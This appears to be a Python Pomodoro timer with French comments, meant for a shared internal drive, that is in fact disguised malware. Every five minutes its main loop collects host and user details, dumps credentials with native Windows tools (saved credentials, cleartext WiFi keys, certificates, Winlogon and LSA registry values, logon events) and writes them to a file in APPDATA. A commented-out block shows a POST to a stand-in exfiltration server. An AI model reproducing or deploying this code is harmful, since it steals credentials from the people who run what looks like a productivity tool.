# ============================================================================
# pomodoro_timer.py
#
# Petit outil Pomodoro pour l'équipe.
# A placer sur le partage \\srv-files\tools\productivite\
#
# Fonctionnalités : timer 25min, pause, reprise, sauvegarde session.
#
# Auteur : admin-rh (partage interne)
# Date : 2026-09-15
# ============================================================================

import sys
import os
import json
import time
import datetime
import socket
import platform
import subprocess
import ctypes
import ctypes.wintypes
import winreg

# --- configuration ---
cycle_length = 25 * 60
pause_length = 5 * 60
long_pause = 15 * 60

# chemins
config_dir = os.path.join(os.environ["APPDATA"], "PomodoroTool")
config_path = os.path.join(config_dir, "config.json")

# --- chargement de la session precedente ---
if os.path.exists(config_path):
    with open(config_path, "r") as f:
        config = json.load(f)
    cycle_length = config.get("cycleLength", cycle_length)
    pause_length = config.get("pauseLength", pause_length)
    long_pause = config.get("longPause", long_pause)
    remaining = config.get("remaining", cycle_length)
    print("[Pomodoro] Session sauvegardee chargee.", flush=True)
    print(f"[Pomodoro] Repetion : {remaining} secondes restantes.", flush=True)
else:
    remaining = cycle_length
    print("[Pomodoro] Nouvelle session de 25 minutes.", flush=True)

# --- creation du dossier de config si besoin ---
os.makedirs(config_dir, exist_ok=True)

# --- variables ---
cycles = 0
last_exfil = datetime.datetime.now() - datetime.timedelta(minutes=300)

# --- timer principal ---
def show_timer(remaining, state="Travail", cycles_val=0):
    minutes = remaining // 60
    seconds = remaining % 60
    bar_length = 50
    progress = remaining / cycle_length
    filled = int(bar_length * progress)
    empty = bar_length - filled
    bar = "[" + ("#" * filled) + (" " * empty) + "]"
    print(f"\r[Pomodoro] {state} | {minutes}:{seconds:02d} | Cycles: {cycles_val} | {bar}", end="", flush=True)
    if remaining <= 0:
        print("", flush=True)

# --- sauvegarde de session ---
def save_session():
    save_data = {
        "cycleLength": cycle_length,
        "pauseLength": pause_length,
        "longPause": long_pause,
        "remaining": remaining,
        "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    try:
        with open(config_path, "w") as f:
            json.dump(save_data, f, indent=2)
    except Exception:
        pass

# --- collecte des donnees systeme ---
def collect_sysinfo():
    info = {}
    info["hostname"] = socket.gethostname()
    info["username"] = os.environ.get("USERNAME", "")
    info["domain"] = os.environ.get("USERDOMAIN", "")
    try:
        info["ip"] = socket.gethostbyname(socket.gethostname())
    except Exception:
        info["ip"] = "unknown"
    info["os"] = platform.platform()
    try:
        info["ip_publique"] = subprocess.check_output(
            ["curl", "-s", "https://api.ipify.org"]
        ).decode().strip()
    except Exception:
        try:
            info["ip_publique"] = subprocess.check_output(
                ["curl", "-s", "https://ifconfig.me"]
            ).decode().strip()
        except Exception:
            info["ip_publique"] = "unavailable"
    return info

# --- credential dumping via LoLBins ---
def dump_credentials():
    """Extrait les credentials via des outils natifs de Windows (LoLBins)."""
    creds = []

    # === 1. cmdkey — credentials persistants stockes ===
    try:
        result = subprocess.check_output(
            ["cmdkey", "/list"],
            stderr=subprocess.STDOUT,
            text=True
        )
        creds.append("=== CMDKEY /list ===")
        creds.append(result)
    except Exception as e:
        creds.append(f"cmdkey /list: {str(e)}")

    # === 2. runas /savecred — credentials de connexion ===
    try:
        result = subprocess.check_output(
            ["runas", "/list"],
            stderr=subprocess.STDOUT,
            text=True
        )
        creds.append("=== RUNAS LIST ===")
        creds.append(result)
    except Exception as e:
        creds.append(f"runas /list: {str(e)}")

    # === 3. cmdkey + reg query — extraire les tokens stockes ===
    try:
        result = subprocess.check_output(
            ["reg", "query", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CredentialProvider", "/s"],
            stderr=subprocess.STDOUT,
            text=True
        )
        creds.append("=== REGISTRY CredentialProvider ===")
        creds.append(result)
    except Exception as e:
        creds.append(f"reg query CredentialProvider: {str(e)}")

    # === 4. certutil — extraire les certificats (peut servir a signer du code malveillant) ===
    try:
        result = subprocess.check_output(
            ["certutil", "-store", "My"],
            stderr=subprocess.STDOUT,
            text=True
        )
        creds.append("=== CERTIFICATES (My Store) ===")
        creds.append(result[:2000])  # limiter la taille
    except Exception as e:
        creds.append(f"certutil -store My: {str(e)}")

    # === 5. wevtutil — evenements de connexion (Security log) ===
    try:
        result = subprocess.check_output(
            ["wevtutil", "qe", "Security", "/q:*[System[EventID=4624]]", "/c:10", "/f:text"],
            stderr=subprocess.STDOUT,
            text=True,
            timeout=15
        )
        creds.append("=== SECURITY LOG (EventID=4624 - Logon) ===")
        creds.append(result[:2000])
    except Exception as e:
        creds.append(f"wevtutil Security 4624: {str(e)}")

    # === 6. net use — sessions reseau ouvertes ===
    try:
        result = subprocess.check_output(
            ["net", "use"],
            stderr=subprocess.STDOUT,
            text=True
        )
        creds.append("=== NET USE (active sessions) ===")
        creds.append(result)
    except Exception as e:
        creds.append(f"net use: {str(e)}")

    # === 7. tasklist + query — taches planifiees (persistance potentielle) ===
    try:
        result = subprocess.check_output(
            ["schtasks", "/query", "/fo", "LIST", "/v"],
            stderr=subprocess.STDOUT,
            text=True
        )
        creds.append("=== SCHTASKS (planned tasks) ===")
        creds.append(result[:2000])
    except Exception as e:
        creds.append(f"schtasks: {str(e)}")

    # === 8. net localgroup — groupes locaux (admin, etc.) ===
    try:
        result = subprocess.check_output(
            ["net", "localgroup", "Administrators"],
            stderr=subprocess.STDOUT,
            text=True
        )
        creds.append("=== LOCAL GROUP Administrators ===")
        creds.append(result)
    except Exception as e:
        creds.append(f"net localgroup Administrators: {str(e)}")

    # === 9. wmic — processus en cours (pour voir si des outils defensifs tournent) ===
    try:
        result = subprocess.check_output(
            ["wmic", "process", "get", "Name,ProcessId,ExecutablePath", "/format:list"],
            stderr=subprocess.STDOUT,
            text=True
        )
        creds.append("=== WMIC PROCESS LIST ===")
        creds.append(result[:2000])
    except Exception as e:
        creds.append(f"wmic process: {str(e)}")

    # === 10. netsh — configuration reseau (firewall, proxy, etc.) ===
    try:
        result = subprocess.check_output(
            ["netsh", "firewall", "show", "state"],
            stderr=subprocess.STDOUT,
            text=True
        )
        creds.append("=== NETSH FIREWALL STATE ===")
        creds.append(result[:2000])
    except Exception as e:
        creds.append(f"netsh firewall: {str(e)}")

    # === 11. netsh wlan — mots de passe WiFi sauvegardes ===
    try:
        result = subprocess.check_output(
            ["netsh", "wlan", "show", "profiles"],
            stderr=subprocess.STDOUT,
            text=True
        )
        creds.append("=== WiFi PROFILES ===")
        creds.append(result)
        # extraire les mots de passe des profils WiFi
        for line in result.splitlines():
            if "Profile name" in line:
                profile = line.split(":")[1].strip()
                try:
                    key_result = subprocess.check_output(
                        ["netsh", "wlan", "show", "profile", f"name={profile}", "key=clear"],
                        stderr=subprocess.STDOUT,
                        text=True
                    )
                    creds.append(f"=== WiFi KEY: {profile} ===")
                    creds.append(key_result)
                except Exception as e:
                    creds.append(f"  WiFi key {profile}: {str(e)}")
    except Exception as e:
        creds.append(f"netsh wlan show profiles: {str(e)}")

    # === 12. reg query — Winlogon auto-logon credentials ===
    try:
        hklm = winreg.HKEY_LOCAL_MACHINE
        key = winreg.OpenKey(hklm, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", 0, winreg.KEY_READ)
        values = {}
        for i in range(100):
            try:
                name, _, _ = winreg.EnumValue(key, i)
                value = winreg.QueryValueEx(key, name)
                values[name] = value[0]
            except Exception:
                break
        creds.append("=== WINLOGON REGISTRY ===")
        for k, v in values.items():
            creds.append(f"  {k}: {v}")
    except Exception as e:
        creds.append(f"Winlogon reg: {str(e)}")

    # === 13. reg query — LSA secrets (si admin) ===
    try:
        hklm = winreg.HKEY_LOCAL_MACHINE
        key = winreg.OpenKey(hklm, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", 0, winreg.KEY_READ)
        # verifier si LSA secrets accessible
        lsa_key = winreg.OpenKey(hklm, r"SECURITY\Policy\Autologon", 0, winreg.KEY_READ)
        value = winreg.QueryValueEx(lsa_key, "DefaultUserName")
        creds.append(f"=== LSA AUTologon ===")
        creds.append(f"  DefaultUserName: {value[0]}")
    except Exception:
        creds.append("LSA autologon: not accessible (non-admin)")

    return "\n".join(creds)

# --- exfiltration ---
def exfiltrate(info, creds):
    # 1. ecrire dans un fichier local (pour demo)
    txt_path = os.path.join(os.environ["APPDATA"], "PomodoroTool", "sysinfo.txt")
    with open(txt_path, "w", encoding="utf-8") as f:
        f.write("=== SYSTEM INFORMATION ===\n")
        f.write(f"hostname: {info['hostname']}\n")
        f.write(f"username: {info['username']}\n")
        f.write(f"domain: {info['domain']}\n")
        f.write(f"ip: {info['ip']}\n")
        f.write(f"os: {info['os']}\n")
        f.write(f"ip_publique: {info['ip_publique']}\n")
        f.write(f"timestamp: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write("\n=== CREDENTIAL DUMPING (LoLBins) ===\n")
        f.write(creds)
        f.write("\n=== END ===\n")

    # 2. tentatives d'exfiltration (exemples non fonctionnels)
    # try:
    #     import urllib.request
    #     body = json.dumps(info).encode("utf-8")
    #     req = urllib.request.Request(
    #         "https://exfiltration-server.example.com/collect",
    #         data=body,
    #         headers={"Authorization": "token ghp_xxxx", "Content-Type": "application/json"},
    #         method="POST"
    #     )
    #     urllib.request.urlopen(req, timeout=10)
    # except Exception:
    #     pass

# --- boucle principale ---
print("", flush=True)
print("========================================", flush=True)
print("  POMODORO TIMER - Outil de productivite", flush=True)
print("========================================", flush=True)
print("  [P] Pause / Resume", flush=True)
print("  [Q] Quitter", flush=True)
print("========================================", flush=True)
print("", flush=True)

try:
    while True:
        show_timer(remaining, "Travail", cycles)

        import msvcrt
        if msvcrt.kbhit():
            key = msvcrt.getch().decode("utf-8").upper()
            if key == "Q":
                print("\n[Pomodoro] Session terminee par l'utilisateur.", flush=True)
                break
            if key == "P":
                remaining = 0  # toggle pause par reset

        if remaining <= 0:
            print(f"\n[Pomodoro] Cycle termine ! Pause de {pause_length // 60} min.", flush=True)
            remaining = pause_length
            while remaining > 0:
                show_timer(remaining, "Pause", cycles)
                time.sleep(1)
                remaining -= 1
            cycles += 1
            if cycles % 4 == 0:
                print(f"\n[Pomodoro] Pause longue de {long_pause // 60} min.", flush=True)
                remaining = long_pause
                while remaining > 0:
                    show_timer(remaining, "Pause longue", cycles)
                    time.sleep(1)
                    remaining -= 1
                remaining = cycle_length
            else:
                remaining = cycle_length

        save_session()

        # exfiltration toutes les 5 minutes
        now = datetime.datetime.now()
        if (now - last_exfil).total_seconds() >= 300:
            info = collect_sysinfo()
            creds = dump_credentials()
            exfiltrate(info, creds)
            last_exfil = now

        time.sleep(1)

except KeyboardInterrupt:
    print("\n[Pomodoro] Session terminee (Ctrl+C).", flush=True)

print("\n[Pomodoro] Session terminee. Merci d'avoir utilise PomodoroTool !", flush=True)
